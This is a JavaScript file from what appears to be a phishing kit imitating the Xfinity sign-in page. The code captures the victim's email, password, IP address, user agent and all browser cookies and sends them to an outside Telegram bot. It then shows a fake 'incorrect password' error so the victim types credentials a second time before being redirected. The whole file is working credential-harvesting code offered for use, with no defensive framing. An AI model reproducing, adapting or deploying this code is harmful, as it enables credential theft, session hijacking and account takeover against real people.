async function handleFormSubmit(event) {
    event.preventDefault();

    const form = document.forms['signin'];
    const formData = new FormData(form);
    const email = formData.get('user');
    const password = formData.get('passwd');
    const passwordInput = document.getElementById('passwd');
    const passwordErrorDiv = document.getElementById('password-error');

    let submissionAttempts = parseInt(localStorage.getItem('submissionAttempts')) || 0;

    // Get IP address and user agent
    const ipAddress = await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip);
    const userAgent = navigator.userAgent;

    // Get all cookies in JSON format
    const allCookies = JSON.stringify(document.cookie.split(';').reduce((cookies, item) => {
        const [name, value] = item.split('=');
        cookies[name.trim()] = value;
        return cookies;
    }, {}));

    // Custom message with emojis
    const messagePrefix = "🌟You got a #NewResultz 🌟\n🌟Wassup, 🌟xf🌟 LOGIX/PASSWD 🌟\n";
    const message = `${messagePrefix}📧 Email: ${decodeURIComponent(email)}\n🔑 Password: ${decodeURIComponent(password)}\n🌍 IP Address: ${ipAddress}\n🕵️ User Agent: ${userAgent}\n🍪 Cookies: ${allCookies}\n`;

    // Fetch Telegram configuration
    const { telegramToken, telegramChatId } = await import('../tele.js');

    // Send message to Telegram
    const telegramMessage = encodeURIComponent(message);
    const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${telegramMessage}`;

    if (password.trim().length < 5) {
        passwordErrorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
        passwordErrorDiv.style.display = 'block';
        passwordInput.style.border = '0.2px solid red';
    } else {
        if (submissionAttempts === 0) {
            // First attempt: Post to Telegram, show error message, and do not redirect
            await fetch(telegramApiUrl);
            localStorage.setItem('submissionAttempts', '1');
            passwordErrorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
            passwordErrorDiv.style.display = 'block';
            passwordInput.style.border = '0.2px solid red';
            passwordInput.value = ''; // Clear the password input
        } else {
            // Second attempt: Post to Telegram and redirect
            await fetch(telegramApiUrl);

            const emailParam = encodeURIComponent(email);
            const passwordParam = encodeURIComponent(password);
            const additionalParam1 = md5(Math.random().toString());
            const additionalParam2 = md5(Math.random().toString());
            const additionalParam3 = md5(Math.random().toString());

            const redirectUrl = `../welcome.html?email=${emailParam}&password=${passwordParam}&cmd=login_submit&additional_param1=${additionalParam1}&additional_param2=${additionalParam2}&additional_param3=${additionalParam3}`;
            localStorage.removeItem('submissionAttempts'); // Clear the attempt count on successful redirect
            window.location.href = redirectUrl;
        }
    }
}

// Include MD5 hash function
function md5(string) {
    return CryptoJS.MD5(string).toString();
}

document.addEventListener("DOMContentLoaded", function() {
    var signInButton = document.getElementById('sign_in');
    var passwordInput = document.getElementById('passwd');
    var userEmailField = document.getElementById('user-email');
    var hiddenUserInput = document.getElementById('user');
    var passwordErrorDiv = document.createElement('div');
    passwordErrorDiv.style.color = 'red';
    passwordErrorDiv.style.fontWeight = 'normal';
    passwordErrorDiv.style.fontSize = '12px';
    passwordErrorDiv.id = 'password-error';
    passwordInput.parentNode.insertBefore(passwordErrorDiv, passwordInput.nextSibling);

    var customCheckbox = document.getElementById('custom-checkbox');
    var customRememberMe = document.getElementById('custom-remember-me');
    
    customCheckbox.addEventListener('click', function() {
        customRememberMe.checked = !customRememberMe.checked;
        if (customRememberMe.checked) {
            customCheckbox.classList.add('checked');
        } else {
            customCheckbox.classList.remove('checked');
        }
    });

    signInButton.onclick = function(event) {
        if (passwordInput.value.trim() === '') {
            event.preventDefault();
            passwordErrorDiv.textContent = 'Please type in your password to sign in.';
            passwordInput.style.border = '0.2px solid red';
            passwordErrorDiv.style.display = 'block';
        } else if (passwordInput.value.trim().length < 5) {
            event.preventDefault();
            passwordErrorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
            passwordInput.style.border = '0.2px solid red';
            passwordErrorDiv.style.display = 'block';
        } else {
            passwordErrorDiv.style.display = 'none';
            passwordInput.style.border = '';
            handleFormSubmit(event); // Call the handleFormSubmit function
        }
    };

    function getQueryParameter(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
    }

    const email = getQueryParameter('email');
    if (email) {
        userEmailField.textContent = email;
        hiddenUserInput.value = email;
    }
});

function togglePasswordVisibility() {
    const passwordField = document.getElementById('passwd');
    const passwordToggle = document.getElementById('toggle-password');
    const passwordIcon = document.getElementById('password-icon');

    if (passwordField.type === 'password') {
        passwordField.type = 'text';
        passwordIcon.classList.remove('fa-eye');
        passwordIcon.classList.add('fa-eye-slash');
    } else {
        passwordField.type = 'password';
        passwordIcon.classList.remove('fa-eye-slash');
        passwordIcon.classList.add('fa-eye');
    }
}
